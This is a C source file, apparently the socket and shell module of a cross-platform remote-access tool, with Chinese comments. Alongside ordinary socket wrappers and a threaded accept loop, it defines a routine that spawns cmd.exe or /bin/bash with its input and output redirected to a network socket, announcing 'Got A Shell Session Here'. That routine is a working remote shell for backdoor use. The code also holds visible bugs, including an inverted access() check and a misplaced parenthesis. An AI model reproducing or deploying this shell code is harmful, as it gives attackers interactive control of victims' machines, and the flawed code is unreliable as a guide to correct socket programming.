#include "BaseAPI.h"

#define MAX_SHELL_PATH      255
#define SET_SHELL_PATH_ERROR -1
#define UNKNOWN_SHELL_PATH   -2
#define SET_SHELL_PATH_OK     1

struct ValueForCallBack{
    int socket;
    Server_CallBack_Fun fun;
    char *funarg;
};
//**************************************************
char SHELL_FILE_PATH[MAX_SHELL_PATH];
//**************************************************

int Set_Shell_Path_Value();

int API_env_init(){
    GLOBAL_INIT_ENV();
#ifdef WIN32
    // 初始化套接字库 win32 下需要
    WSADATA wsd;
    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
    {
        Printf_Error("WSAStartup failed!");
        return ENV_INIT_FALSE;
    }
#else
    signal(SIGPIPE, SIG_IGN);
#endif
    if (Set_Shell_Path_Value() == SET_SHELL_PATH_OK){
        return ENV_INIT_OK;
    }
    return ENV_INIT_FALSE;
}

int Set_Shell_Path_Value(){
#ifdef WIN32
    strncpy(SHELL_FILE_PATH,"cmd.exe",MAX_SHELL_PATH);
#elif __linux__
    // normal linux
    if(access("/bin/bash",6)){
        strncpy(SHELL_FILE_PATH,"/bin/bash",MAX_SHELL_PATH);
    }
    // android linux
    else if( access("/system/bin/sh"),6){
        strncpy(SHELL_FILE_PATH,"/system/bin/sh",MAX_SHELL_PATH);
    }
    else {
        return SET_SHELL_PATH_ERROR;
    }
#elif __APPLE__
    strncpy(SHELL_FILE_PATH,"/bin/bash",MAX_SHELL_PATH);
    //printf("--->  %s\n",SHELL_FILE_PATH);
#else
    printf("__apple__?");
    return SET_SHELL_PATH_ERROR;
#endif
    return SET_SHELL_PATH_OK;
}

#ifdef WIN32
struct hostent *API_socket_gethostbyname(char * ser_addr){
    return gethostbyname(ser_addr); 
}
#else //__linux__ 
struct in_addr *API_socket_getaddrinfo(char *url){
    struct addrinfo *result;
    int error = getaddrinfo(url,NULL,NULL,&result);
    return  &(((struct sockaddr_in *)(result->ai_addr))->sin_addr);
}
#endif

int API_socket_connect(char *ser_addr,int port){
#ifdef WIN32
	WSADATA wd;
	SOCKET sock;
	struct sockaddr_in sin;
    struct hostent * des_addr;
	int size = sizeof(sin);
	memset(&sin, 0, sizeof(sin));
	WSAStartup(MAKEWORD( 1, 1 ), &wd);
	sock=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sin.sin_family = AF_INET;
	bind(sock, (struct sockaddr*)&sin, size);
	sin.sin_port = htons(port);

    des_addr = API_socket_gethostbyname(ser_addr);
    if ( des_addr == NULL ){
        return SOCKET_CONNECT_ERROR;
    }
    sin.sin_addr = *(struct in_addr*)des_addr->h_addr;
//	sin.sin_addr.s_addr = inet_addr(ser_addr);
	connect(sock, (struct sockaddr*)&sin, size);
	return sock;
#else// __linux__
    struct sockaddr_in server_addr,client_addr;
    struct hostent * des_addr;
    memset(&client_addr, 0 ,sizeof(client_addr));
    //bzero(&client_addr,sizeof(client_addr));
    client_addr.sin_family = AF_INET; // internet
    client_addr.sin_addr.s_addr = htons( INADDR_ANY ); // local address
    client_addr.sin_port = htons(0); // any port
    int client_socket = socket(AF_INET,SOCK_STREAM,0);
    if( client_socket < 0){
        Printf_Error("Create Socket Failed ! \n");
        return SOCKET_CONNECT_ERROR;
    }
    if( bind(client_socket,(struct sockaddr*)&client_addr,sizeof(client_addr))){
        Printf_Error("Client Bind Port Failed ! \n");
        return SOCKET_CONNECT_ERROR;
    }
    memset(&server_addr,0,sizeof(server_addr));
    //bzero(&server_addr,sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    // dns url -> ip
    server_addr.sin_addr = *(API_socket_getaddrinfo(ser_addr));
    if( server_addr.sin_addr.s_addr == 0 )
    {
        Printf_Error("Server IP Address Error!\n");
        return SOCKET_CONNECT_ERROR;
    }
    server_addr.sin_port = htons(port);
    //向服务器发起连接,连接成功后client_socket代表了客户机和服务器的一个socket连接
    if(connect(client_socket,(struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        Printf_Error("Can Not Connect To %s!\n", ser_addr );
        return SOCKET_CONNECT_ERROR;
    }
    //puts("got the client_socket");
    return client_socket;
#endif
}

int API_socket_init_server(int port,int maxlisten){
#ifdef WIN32
    SOCKET  locals;
    struct sockaddr_in   s_sin;        
    memset(&s_sin, 0, sizeof(s_sin));
    locals = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    s_sin.sin_family = AF_INET;
    s_sin.sin_port = htons(port);
    s_sin.sin_addr.s_addr = htonl(INADDR_ANY);
      
    if(SOCKET_ERROR == bind(locals, (struct sockaddr *)&s_sin, sizeof(s_sin)))
    {
           Printf_Error("bind wrong.");
           return ;
    }
        
    listen(locals, maxlisten);
    return locals;
#else 
    int socket_desc;
    struct sockaddr_in server;
    int c;
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        Printf_Error("Could not create socket [ port = %d ].\n",port);
        return SOCKET_SERVER_INIT_ERROR;
    }
    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons( port );
    //Bind
    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //print the error message
        Printf_Error("bind port %d .\n",port);
        return SOCKET_SERVER_INIT_ERROR;
    }
    // puts("bind done");
    //Listen
    listen(socket_desc , maxlisten);
    return socket_desc;
#endif
}


int API_socket_read_state(int sock,int sec,int usec){
    fd_set fds ;
    int n = 1;
    struct timeval tv ;
    // Set up the file descriptor set.
    FD_ZERO(&fds) ;
    FD_SET(sock, &fds) ;
    // Set up the struct timeval for the timeout.
    tv.tv_sec = sec ;
    tv.tv_usec = usec ;
    // Wait until timeout or data received.
    n = select ( sock + 1, &fds, NULL, NULL, &tv ) ;
    if ( n >0 ){
        if ( FD_ISSET(sock,&fds) ) {
            return SOCKET_CAN_READ_STATE; // socket 可以读
        }
        return SOCKET_MAY_CLOSE_NOW;
    }
    else if ( n == 0 ) return SOCKET_OVER_TIME; // 超时
    return SOCKET_INIT_ERROR; // 出错了
}

int API_socket_write_state(int sock,int sec,int usec){
    fd_set fds ;
    int n = 1;
    struct timeval tv ;
    // Set up the file descriptor set.
    FD_ZERO(&fds) ;
    FD_SET(sock, &fds) ;
    // Set up the struct timeval for the timeout.
    tv.tv_sec = sec ;
    tv.tv_usec = usec ;
    // Wait until timeout or data received.
    n = select ( sock + 1, NULL, &fds, NULL, &tv ) ;

    if ( n >0 ){
        if ( FD_ISSET(sock,&fds) ) {
            return SOCKET_CAN_WRITE_STATE; // socket 可以读
        }
        return SOCKET_MAY_CLOSE_NOW;
    }
    else if ( n == 0 ) return SOCKET_OVER_TIME; // 超时
    return SOCKET_INIT_ERROR; // 出错了
}


int API_socket_send(int sock,char *buf,int buflen){
    return send(sock,buf,buflen,0);
}

int API_socket_recv(int sock,char *buf,int buflen){
    int res = recv(sock,buf,buflen,0);
    if(res <= 0){
        API_socket_close(sock);
        return SOCKET_RECV_ERROR;
    }
    return res;
}

int API_socket_close(int sock){
    if (sock>0){
#ifdef WIN32
        closesocket(sock);
#else
        close(sock);
#endif
    }
    return 1;
}

MIC_THREAD_FUN_DEF(cbf_for_server_start,pvalue){
    Server_CallBack_Fun m_fun = 
        ((struct ValueForCallBack *)pvalue) -> fun;
    int m_sock = 
        ((struct ValueForCallBack *)pvalue) -> socket;
    char *cbf  = 
        ((struct ValueForCallBack *)pvalue) -> funarg;
    MIC_USLEEP(10);
    int res = m_fun(m_sock,cbf);
    MIC_THREAD_END();
    return MIC_THREAD_RETVALUE;
}


struct struct_for_StartServer{
    int socket_server;
    Server_CallBack_Fun function;
    char *funarg;
};

MIC_THREAD_FUN_DEF(StartServerFunction,serverinfo){
    struct struct_for_StartServer *info = 
        (struct struct_for_StartServer *)serverinfo;
    int        socks_server = info->socket_server;
    Server_CallBack_Fun fun = info-> function;
    char            *funarg = info->funarg;
    struct sockaddr_in client_addr;
    int client_sock;
    int len_sockaddr;
    int fun_result;
    int sockbuf;
    struct ValueForCallBack * pvalue ;
    MyPrintf("start socket server here");
    len_sockaddr = sizeof(struct sockaddr_in);
    MyPrintf("start accept socket client here");
    while( (client_sock = accept(
                socks_server,
                (struct sockaddr *)&client_addr,
                (socklen_t*)&len_sockaddr
                ))>= 0 ){
        // 对于每一个新连接的会话，都用fun 函数进行处理
        /// fun 函数应当以线程方式进行处理，以免程序阻塞
        pvalue = 
            (struct ValueForCallBack *)malloc(sizeof(struct ValueForCallBack));
        if(pvalue == NULL) {
            Printf_Error("server start error pvalue is NULL");
            return MIC_THREAD_RETVALUE;
        }
        pvalue -> fun = fun;
        pvalue -> socket = client_sock;
        pvalue -> funarg = funarg;
        MIC_THREAD_HANDLE_ID thread_id;
        if( MIC_THREAD_CREATE (thread_id, cbf_for_server_start , pvalue ) <0){
            API_socket_close(sockbuf);
            Printf_Error("server start error thread error");
            return MIC_THREAD_RETVALUE;
        }
        //MIC_THREAD_JOIN(thread_id);
        MIC_USLEEP(1);
        free(pvalue);
    }
    return MIC_THREAD_RETVALUE;
}

int API_socket_server_start(int socks_server,Server_CallBack_Fun fun,char *funarg){
    MIC_THREAD_HANDLE_ID thread_id;
    struct struct_for_StartServer *info = 
        (struct struct_for_StartServer *)
        malloc(sizeof(struct struct_for_StartServer));
    info -> socket_server = socks_server;
    info -> function      = fun;
    info -> funarg        = funarg;
Printf_DEBUG("create thread ??? ");
    if(MIC_THREAD_CREATE(thread_id,StartServerFunction,info)< 0){
        Printf_Error("Start Server Error");
        return API_SOCKET_SERVER_START_ERROR;
    }
//    MIC_THREAD_JOIN(thread_id);
    MIC_USLEEP(1);
    return API_SOCKET_SERVER_START_OK;
}

int API_m_itochar(int a,char *b,int len){
    int i;
    if(len!=4) return I_TO_CHAR_ERROR;
    int buf = a;
    for (i = 0;i< len ;i++){
        b[i] = buf % 128;
        if(b[i] < 0) return I_TO_CHAR_ERROR;
        buf = buf / 128;
    }
    return I_TO_CHAR_OK;
}

int API_m_chartoi(char *b,int len){
    int i;
    int result = 0;
    if (len!=4)return CHAR_TO_I_ERROR;
    for (i = len - 1 ;i >= 0 ; i--){
        if (b[i] < 0) return CHAR_TO_I_ERROR;
        result = result * 128 + b[i];
    }
    return result;
}

int API_m_sleep(int usec){
    usleep(usec);
    return 1;
}

int API_set_usec_time(int usec){
    GLOBAL_set_usec_time(usec);
    return 1;
}
    
int API_get_usec_time(){
    return GLOBAL_get_usec_time();
}

///////////////////////////////////////////////////////////////////////////
#define START_SHELLTHREAD_ERROR -1
#define START_SHELLTHREAD_OK     1
#define SHELL_WELCOME_MSG        "Got A Shell Session Here >>\n"
#define SHELL_BYE_MSG            "GoodBye ! Shell Session Closed Now .\n"
///////////////////////////////////////////////////////////////////////////
MIC_THREAD_FUN_DEF (shelltest,socket){
    int sock = *((int*)socket);
    MIC_USLEEP(1);
    API_socket_send(sock,SHELL_WELCOME_MSG,strlen(SHELL_WELCOME_MSG));
    puts("start a new cmd shell here");
#ifdef __WIN32__
    STARTUPINFO si;
    PROCESS_INFORMATION  pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    // API_socket_send(si.hStdOutput,"Hello Client\n",strlen("Hello Client\n"));
    CreateProcess(
        NULL, SHELL_FILE_PATH, NULL, NULL,
        TRUE, 0, 0, NULL, &si, &pi
    );
    API_socket_send(sock,SHELL_BYE_MSG,strlen(SHELL_BYE_MSG));
    API_socket_close(sock);
#else //  __linux__
    int fpid;
    printf("%s\n" ,SHELL_FILE_PATH);
    fpid = fork();
    
    if(fpid<0){
        printf("error \n");
    }
    else if( fpid == 0){
        dup2(sock,2);
        dup2(sock,1);
        dup2(sock,0);

        system(SHELL_FILE_PATH);
        API_socket_send(sock,SHELL_BYE_MSG,strlen(SHELL_BYE_MSG));
    }
#endif
    MIC_THREAD_END();
    return 0;
}

int API_Start_ShellThread_for_sock(int sock){
    int sockbuf = sock;
    MIC_THREAD_HANDLE_ID thread_id;
    if( MIC_THREAD_CREATE(thread_id,shelltest,(void *) &sockbuf) <0){
        API_socket_close(sockbuf);
        return START_SHELLTHREAD_ERROR;
    }
    //  这个休眠很重要，否则子线程读取到的 sockbuf 
    //  数据将会被清零，那时本线程已经执行完毕，占空间释放了。
    MIC_USLEEP(5);
    return START_SHELLTHREAD_OK;
}
